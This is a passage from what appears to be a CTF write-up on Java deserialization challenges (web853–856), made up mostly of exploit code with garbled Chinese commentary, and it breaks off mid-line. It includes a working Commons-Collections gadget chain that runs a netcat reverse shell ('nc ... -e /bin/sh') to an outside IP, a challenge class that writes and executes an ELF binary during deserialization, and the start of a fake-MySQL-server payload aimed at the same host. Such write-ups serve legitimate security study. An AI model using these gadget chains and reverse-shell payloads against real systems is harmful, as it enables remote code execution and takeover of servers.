f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(transformerChain2,transformers);</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        Class c = DefaultedMap.class;</span></span><br><span class="line"><span class="comment">//        Field transformers1 = c.getDeclaredField(&quot;value&quot;);</span></span><br><span class="line"><span class="comment">//        transformers1.setAccessible(true);</span></span><br><span class="line"><span class="comment">//        transformers1.set(defaultedMap1,transformerChain2);</span></span><br><span class="line"><span class="comment">//        transformers1.set(defaultedMap2,transformerChain2);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        serialize(hashtable);</span><br><span class="line">        unserialize(<span class="string">&quot;./ser.bin&quot;</span>);</span><br><span class="line"><span class="comment">//        ByteArrayOutputStream baos = new ByteArrayOutputStream();</span></span><br><span class="line"><span class="comment">//        ObjectOutputStream oos = new ObjectOutputStream(baos);</span></span><br><span class="line"><span class="comment">//        oos.writeObject(hashtable);</span></span><br><span class="line"><span class="comment">//        String payload = new String(Base64.getEncoder().encode(baos.toByteArray()));</span></span><br><span class="line"><span class="comment">//        System.out.println(payload);</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./ser.bin&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> objectInputStream.readObject();</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="web854">web854</h2><p>DefaultMapç»•è¿‡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.map.DefaultedMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CCBypassLazyMap</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException, NoSuchFieldException &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;nc 110.41.17.183 250 -e /bin/sh&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        Map&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">//Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,chainedTransformer);</span></span><br><span class="line"></span><br><span class="line">        <span class="type">DefaultedMap</span> <span class="variable">defaultedMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultedMap</span>(chainedTransformer);</span><br><span class="line">        <span class="comment">//åˆ›å»ºInvocationHandler</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(defaultedMap, <span class="string">&quot;123&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> BadAttributeValueExpException.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(badAttributeValueExpException,tiedMapEntry);</span><br><span class="line"></span><br><span class="line">        serialize(badAttributeValueExpException);</span><br><span class="line">        <span class="comment">//unserialize(&quot;ser.bin&quot;);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./ser.bin&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> objectInputStream.readObject();</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="web855">web855</h2><p>é¢˜ç›®åšäº†åŠå¤©ä¹Ÿæ²¡å¤ç°å‡ºæ¥ï¼Œæ”¾ä¸ªæºç å…ˆç­‰ç­‰å§</p><p>æºç å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ctfshow.entity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">0x36d</span>;</span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">(String username, String password)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.username = username;</span><br><span class="line">        <span class="built_in">this</span>.password = password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUsername</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUsername</span><span class="params">(String username)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.username = username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getPassword</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setPassword</span><span class="params">(String password)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.password = password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String OBJECTNAME= <span class="string">&quot;ctfshow&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String SECRET=<span class="string">&quot;123456&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span>  String shellCode=<span class="string">&quot;chmod +x ./&quot;</span>+OBJECTNAME+<span class="string">&quot; &amp;&amp; ./&quot;</span>+OBJECTNAME;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">magic</span> <span class="operator">=</span> in.readInt();</span><br><span class="line">        <span class="keyword">if</span>(magic==<span class="number">2135247942</span>)&#123;</span><br><span class="line">            <span class="type">byte</span> <span class="variable">var1</span> <span class="operator">=</span> in.readByte();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">switch</span> (var1)&#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">1</span>:&#123;</span><br><span class="line">                    <span class="type">int</span> <span class="variable">var2</span> <span class="operator">=</span> in.readInt();</span><br><span class="line">                    <span class="keyword">if</span>(var2==<span class="number">0x36d</span>)&#123;</span><br><span class="line"></span><br><span class="line">                        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(OBJECTNAME);</span><br><span class="line">                        fileOutputStream.write(<span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;<span class="number">0x7f</span>,<span class="number">0x45</span>,<span class="number">0x4c</span>,<span class="number">0x46</span>&#125;);</span><br><span class="line">                        <span class="type">byte</span>[] temp = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1</span>];</span><br><span class="line">                        <span class="keyword">while</span>((in.read(temp))!=-<span class="number">1</span>)&#123;</span><br><span class="line">                            fileOutputStream.write(temp);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        fileOutputStream.close();</span><br><span class="line">                        in.close();</span><br><span class="line"></span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">2</span>:&#123;</span><br><span class="line"></span><br><span class="line">                    ObjectInputStream.<span class="type">GetField</span> <span class="variable">gf</span> <span class="operator">=</span> in.readFields();</span><br><span class="line">                    <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> (String) gf.get(<span class="string">&quot;username&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> (String) gf.get(<span class="string">&quot;password&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">                    username = username.replaceAll(<span class="string">&quot;[\\p&#123;C&#125;\\p&#123;So&#125;\uFE00-\uFE0F\\x&#123;E0100&#125;-\\x&#123;E01EF&#125;]+&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">                            .replaceAll(<span class="string">&quot; &#123;2,&#125;&quot;</span>, <span class="string">&quot; &quot;</span>);</span><br><span class="line">                    password = password.replaceAll(<span class="string">&quot;[\\p&#123;C&#125;\\p&#123;So&#125;\uFE00-\uFE0F\\x&#123;E0100&#125;-\\x&#123;E01EF&#125;]+&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">                            .replaceAll(<span class="string">&quot; &#123;2,&#125;&quot;</span>, <span class="string">&quot; &quot;</span>);</span><br><span class="line">                    <span class="type">User</span> <span class="variable">var3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(username,password);</span><br><span class="line">                    <span class="type">User</span> <span class="variable">admin</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(OBJECTNAME,SECRET);</span><br><span class="line">                    <span class="keyword">if</span>(var3 <span class="keyword">instanceof</span>  User)&#123;</span><br><span class="line">                        <span class="keyword">if</span>(OBJECTNAME.equals(var3.getUsername()))&#123;</span><br><span class="line">                            <span class="keyword">throw</span>  <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;object unserialize error&quot;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span>(SECRET.equals(var3.getPassword()))&#123;</span><br><span class="line">                            <span class="keyword">throw</span>  <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;object unserialize error&quot;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span>(var3.equals(admin))&#123;</span><br><span class="line">                            Runtime.getRuntime().exec(shellCode);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="keyword">throw</span>  <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;object unserialize error&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">default</span>:&#123;</span><br><span class="line">                    <span class="keyword">throw</span>  <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;object unserialize error&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//step1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//    private void writeObject(ObjectOutputStream out) throws Exception &#123;</span></span><br><span class="line"><span class="comment">//        //å°†åå­—åè½¬å†™å…¥äºŒè¿›åˆ¶æµ</span></span><br><span class="line"><span class="comment">//        out.writeInt(2135247942);</span></span><br><span class="line"><span class="comment">//        out.writeByte(1);</span></span><br><span class="line"><span class="comment">//        out.writeInt(0x36d);</span></span><br><span class="line"><span class="comment">//        File filename = new File(&quot;src/main/java/com/ctfshow/entity/hack&quot;); //gccç”Ÿæˆçš„æ–‡ä»¶ä½ç½®</span></span><br><span class="line"><span class="comment">//        BufferedInputStream in = new BufferedInputStream(new FileInputStream(filename));</span></span><br><span class="line"><span class="comment">//        ByteArrayOutputStream out2 = new ByteArrayOutputStream(1024);</span></span><br><span class="line"><span class="comment">//        byte[] temp = new byte[1024];</span></span><br><span class="line"><span class="comment">//        int size = 0;</span></span><br><span class="line"><span class="comment">//        while((size = in.read(temp)) != -1)&#123;</span></span><br><span class="line"><span class="comment">//            out2.write(temp, 0, size);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//        in.close();</span></span><br><span class="line"><span class="comment">//        byte[] content = out2.toByteArray();</span></span><br><span class="line"><span class="comment">//        out.write(content);</span></span><br><span class="line"><span class="comment">//        out.defaultWriteObject();</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//step2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(ObjectOutputStream out)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        out.writeInt(<span class="number">2135247942</span>);</span><br><span class="line">        out.writeByte(<span class="number">2</span>);</span><br><span class="line">        out.defaultWriteObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span> == o) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span> (!(o <span class="keyword">instanceof</span> User)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> (User) o;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.hashCode() == user.hashCode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> username.hashCode()+password.hashCode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="web856">web856</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> -<span class="number">7205095498817563965L</span>;</span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">(String username, String password)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.username = username;</span><br><span class="line">        <span class="built_in">this</span>.password = password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUsername</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUsername</span><span class="params">(String username)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.username = username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getPassword</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setPassword</span><span class="params">(String password)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.password = password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span> == o) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span> (!(o <span class="keyword">instanceof</span> User)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> (User) o;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.hashCode() == user.hashCode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> username.hashCode()+password.hashCode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payloadå¦‚ä¸‹ï¼Œåå°„ä¿®æ”¹å€¼ï¼Œåˆ©ç”¨MySQL_Fake_Serverç»“åˆysoserialè¿›è¡Œåå¼¹shellï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªå‘ç‚¹ï¼Œæ‰§è¡ŒMySQL_Fake_Serverçš„æœºå™¨çš„javaç‰ˆæœ¬ä¼šå½±å“payloadçš„ç”Ÿæˆ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ctfshow.entity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">web856</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span>  <span class="keyword">new</span> <span class="title class_">Connection</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">aClass</span> <span class="operator">=</span> connection.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">host</span> <span class="operator">=</span> aClass.getDeclaredField(<span class="string">&quot;host&quot;</span>);</span><br><span class="line">        host.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        host.set(connection,<span class="string">&quot;110.41.17.183&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">port</span> <span class="operator">=</span> 